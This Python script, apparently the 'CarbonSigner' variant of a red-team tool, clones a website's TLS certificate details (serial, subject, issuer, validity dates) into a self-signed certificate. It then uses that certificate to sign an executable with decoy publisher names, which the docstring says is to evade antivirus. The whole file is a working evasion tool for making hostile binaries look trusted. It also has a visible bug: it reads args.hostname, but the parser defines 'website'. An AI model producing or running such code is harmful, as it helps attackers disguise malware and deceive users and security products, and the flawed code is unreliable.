#!/usr/bin/env python3
"""
Author : Paranoid Ninja
Email  : paranoidninja@protonmail.com
Descr  : Spoofs SSL Certificates and Signs executables to evade Antivirus
"""
import argparse
import shutil
import ssl
import subprocess
import sys

from OpenSSL import crypto
from pathlib import Path

TIMESTAMP_URL = 'http://sha256timestamp.ws.symantec.com/sha256/timestamp'


def CarbonCopy(host, port, signee, signed):
    try:
        # Fetching details
        print("[+] Loading public key of {0} in Memory...".format(host))
        ogcert = ssl.get_server_certificate((host, int(port)))
        x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert)

        certDir = Path('certs')
        certDir.mkdir(exist_ok=True)

        # Creating fake certificate
        CNCRT = certDir / (host + ".crt")
        CNKEY = certDir / (host + ".key")
        PFXFILE = certDir / (host + ".pfx")

        # Creating keygen
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
        cert = crypto.X509()

        # Setting certificate details from loaded from the original certificate
        print("[+] Cloning Certificate Version")
        cert.set_version(x509.get_version())

        print("[+] Cloning Certificate Serial Number")
        cert.set_serial_number(x509.get_serial_number())

        print("[+] Cloning Certificate Subject")
        cert.set_subject(x509.get_subject())

        print("[+] Cloning Certificate Issuer")
        cert.set_issuer(x509.get_issuer())

        print("[+] Cloning Certificate Registration & Expiration Dates")
        cert.set_notBefore(x509.get_notBefore())
        cert.set_notAfter(x509.get_notAfter())
        cert.set_pubkey(k)

        print("[+] Signing Keys")
        cert.sign(k, 'sha256')

        print("[+] Creating {0} and {1}".format(CNCRT, CNKEY))
        CNCRT.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        CNKEY.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))

        print("[+] Clone process completed. Creating PFX file for signing executable...")

        try:
            pfx = crypto.PKCS12()
        except AttributeError:
            pfx = crypto.PKCS12Type()

        pfx.set_privatekey(k)
        pfx.set_certificate(cert)
        pfxdata = pfx.export()

        PFXFILE.write_bytes(pfxdata)

        if sys.platform == "win32":
            print("[+] Platform is Windows OS...")
            print("[+] Signing {0} with signtool.exe...".format(signed))
            shutil.copy(signee, signed)
            subprocess.check_call(["signtool.exe", "sign", "/v", "/f", PFXFILE, "/d", "MozDef Corp", "/tr", TIMESTAMP_URL, "/td", "SHA256", "/fd", "SHA256", signed])
        else:
            print("[+] Platform is Linux OS...")
            print("[+] Signing {0} with {1} using osslsigncode...".format(signee, PFXFILE))
            args = ("osslsigncode", "sign", "-pkcs12", PFXFILE, "-n", "Notepad Benchmark Util", "-i", TIMESTAMP_URL, "-in", signee, "-out", signed)

            print("[+] ", end='', flush=True)
            subprocess.check_call(args)

    except Exception as ex:
        print("[X] Something Went Wrong!\n[X] Exception: " + str(ex))


def show_banner():
    banner = """ +-+-+-+-+-+-+-+-+-+-+-+-+\n |C|a|r|b|o|n|S|i|g|n|e|r|\n +-+-+-+-+-+-+-+-+-+-+-+-+\n\n  CarbonSigner v1.0\n  Author: Paranoid Ninja\n"""
    print(banner)


def main():
    parser = argparse.ArgumentParser(description='Impersonates the Certificate of a website.', formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('website', help='domain name of website to get certificate from')
    parser.add_argument('port', help='port that target website is listening on', default=443)
    parser.add_argument('build_executable', help='executable to sign')
    parser.add_argument('signed_executable', help='output name of signed executable')
    args = parser.parse_args()

    show_banner()

    CarbonCopy(args.hostname, args.port, args.build_executable, args.signed_executable)


if __name__ == "__main__":
    main()
